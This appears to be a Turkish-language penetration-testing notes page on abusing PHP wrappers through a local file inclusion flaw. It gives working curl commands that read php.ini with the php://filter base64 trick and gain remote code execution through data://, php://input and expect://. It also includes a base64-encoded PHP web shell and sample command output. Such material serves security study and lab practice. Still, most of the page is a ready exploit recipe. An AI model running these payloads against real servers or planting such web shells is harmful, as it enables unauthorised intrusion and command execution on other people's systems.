---
glightbox: true
icon: material/circle-small
---

# PHP Wrappers

## Data

### Checking PHP Configurations

[Data wrapper](https://www.php.net/manual/en/wrappers.data.php), PHP kodu da dahil olmak üzere harici verileri dahil etmek için kullanılabilir. Ancak bunun için PHP yapılandırmasında `allow_url_include` ayarı etkin durumda olmalıdır. Bu sebeple ilk önce bu ayarın etkin olup olmadığını kontrol etmeliyiz.

İlk adım olarak Apache konumunda (`/etc/php/VERSION/apache2/php.ini`) veya Nginx konumunda (`/etc/php/VERSION/fpm/php.ini`) bulunan PHP yapılandırma dosyasını LFI ile elde etmeliyiz. Geçerli versiyonu (`VERSION`) bulmak için, en güncel PHP sürümünden başlayarak doğru sürümü bulana kadar diğer sürümleri deneyebiliriz.

[PHP Base64 Conversion Filter](https://www.php.net/manual/en/filters.convert.php) ile birlikte aşağıdaki gibi bir cURL komutu çalıştırmalıyız:

```bash
curl "http://SERVER_IP_ADDRESS:PORT/index.php?language=php://filter/read=convert.base64-encode/resource=../../../etc/php/7.4/apache2/php.ini"
```

```html title="Output"
<!DOCTYPE html>

<html lang="en">

...SNIP...

 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O

    ...SNIP...

    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Elde edilen Base64 dizesi çözüldükten sonra `allow_url_include` ayarının etkin olup olmadığı kontrol edilebilir:

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

```text title="Output"
allow_url_include = On
```

Çıktıda görüldüğü üzere `allow_url_include` ayarı etkin durumdadır, yani Data wrapper kullanılabilir.

### Remote Code Execution

Data wrapper kullanımına geçmeden önce, temel bir PHP web shell Base64 ile kodlanır:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
```

```text title="Output"
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Oluşturulan Base64 dizesini kullanarak cURL ile bir saldırı gerçekleştir (örnekte `cmd` olarak `id` komutu kullanılmıştır):

```bash
curl -s 'http://SERVER_IP_ADDRESS:PORT/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```

```text title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Input

Data wrapper kullanımına benzer şekilde [Input wrapper](https://www.php.net/manual/en/wrappers.php.php) da kullanılabilir. Farklı olarak girdi için POST verisi verilmelidir:

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://SERVER_IP_ADDRESS:PORT/index.php?language=php://input&cmd=id" | grep uid
```

```text title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

!!! warning "GET"

    Web uygulamasında bulunan işlev, GET isteklerini kabul edecek şekilde bir zafiyete sahip değilse, dinamik bir web shell (`<?php system($_GET["cmd"]); ?>`) yerine statik bir shell (`<\?php system("id")?>`) kullanılmalıdır.

## Expect

[Expect wrapper](https://www.php.net/manual/en/wrappers.expect.php) direkt olarak komut çalıştırılmasına izin verir. Fakat bu uzantı, sunucu tarafında el ile yüklenmiş ve etkinleştirilmiş olmalıdır.

Aynı `allow_url_include` ayarında olduğu gibi, bu sefer `expect` ayarının etkin olup olmadığını kontrol etmeliyiz:

```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
```

```text title="Output"
extension=expect
```

Expect wrapper aşağıdaki şekilde kullanılabilir:

```bash
curl -s "http://SERVER_IP_ADDRESS:PORT/index.php?language=expect://id" | grep uid
```

```text title="Output"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Expect wrapper kullanımının daha basit olduğu görülebilir. Çünkü bu modül, direkt olarak komut çalıştırmak için tasarlanmıştır.
